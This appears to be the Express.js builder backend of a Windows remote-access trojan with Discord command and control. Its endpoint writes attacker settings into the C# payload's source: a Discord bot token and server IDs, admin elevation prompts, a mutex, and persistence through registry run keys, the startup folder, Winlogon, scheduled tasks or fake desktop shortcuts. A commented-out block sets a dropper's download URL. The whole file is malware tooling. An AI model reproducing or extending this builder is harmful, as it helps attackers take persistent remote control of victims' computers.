import express from 'express';
import fs from 'fs';
import path from 'path';

import crypto from '../utils/crypto.js';
import common from '../utils/common.js';
import regex from '../utils/regex.js';
import config from '../config.js';

const router = express.Router();

const getPersistMethod = (method) => {
    switch (method) {
        case 'auto-run registry key':
            return 'AutoRunRegKey';
        case 'startup folder':
            return 'StartFolder';
        case 'logon registry key (requires admin)':
            return 'WinLogonRegKey';
        case 'task scheduler (requires admin)':
            return 'TaskScheduler';
        case 'impersonate desktop shortcuts':
            return 'ImpersonateLNK';
    }
};

router.post('/update-config', async (req, res) => {
    console.log('updating config...');

    const body = req.body;

    if (body.only_dropper_url) {
        // try {
        //     const configFile = path.resolve('../Dropper/src/config.rs');
        //     let config = await fs.readFile(configFile, 'utf-8');

        //     config = regex.stringRS(config, 'DOWNLOAD_URL', crypto.encrypt(body.download_url, common.cachedKey));
        //     await fs.writeFile(configFile, config, 'utf-8');
        // } catch(e) {
        //     console.error('failed to update url for dropper -', e);

        //     return res
        //         .status(500)
        //         .send('failed to update url for dropper');
        // }

        return res.sendStatus(200);
    }

    const cryptoKey = common.genStr(21);

    config.cachedCryptoKey = cryptoKey;
    console.log('encryption key:', cryptoKey);

    try {
        const configFile = path.resolve('../Main/Source/Config.cs');
        let config = fs.readFileSync(configFile, 'utf-8');

        config = regex.stringCS(config, 'CRYPTO_KEY', cryptoKey);
        config = regex.stringCS(config, 'LAUNCH_KEY', common.genStr(5));

        config = regex.boolCS(config, 'CHECK_USERNAME', body.check_username);
        config = regex.boolCS(config, 'CHECK_DESKTOP_FILE_NAMES', body.check_desktop_file_names);

        config = regex.boolCS(config, 'REQUIRE_ADMIN', body.require_admin);
        config = regex.boolCS(config, 'PROMPT_ADMIN', body.prompt_admin);
        config = regex.boolCS(config, 'FORCE_ADMIN', body.force_admin);
        config = regex.boolCS(config, 'CONTINUE_WITHOUT_ADMIN', body.continue_without_admin);

        config = regex.boolCS(config, 'USE_MUTEX', body.use_mutex);
        config = regex.stringCS(config, 'MUTEX_NAME', body.mutex_name);

        config = regex.boolCS(config, 'ADMIN_CUSTOM_PERSISTENCE', body.better_persistence_when_admin);
        config = regex.enumCS(config, 'PERSISTENCE_METHOD', 'PersistMethod', getPersistMethod(body.persistence_method));

        config = regex.boolCS(config, 'USE_NEW_DIR', body.use_custom_directory);
        config = regex.stringCS(config, 'NEW_DIR', body.custom_directory_path);

        config = regex.boolCS(config, 'USE_NEW_NAME', body.use_custom_name);
        config = regex.stringCS(config, 'NEW_NAME', body.custom_name);

        config = regex.stringCS(config, 'BOT_TOKEN', body.bot_token);
        config = regex.stringCS(config, 'SERVER_ID', body.server_id);
        config = regex.stringCS(config, 'CATEGORY_ID', body.category_id);

        config = regex.stringCS(config, 'COMMAND_PREFIX', body.command_prefix);

        fs.writeFileSync(configFile, config, 'utf-8');
    } catch(e) {
        console.error('failed to update config for main -', e);

        return res
            .status(500)
            .send('failed to update config for main');
    }

    console.log('updated config');
    return res.sendStatus(200);
});

export default router;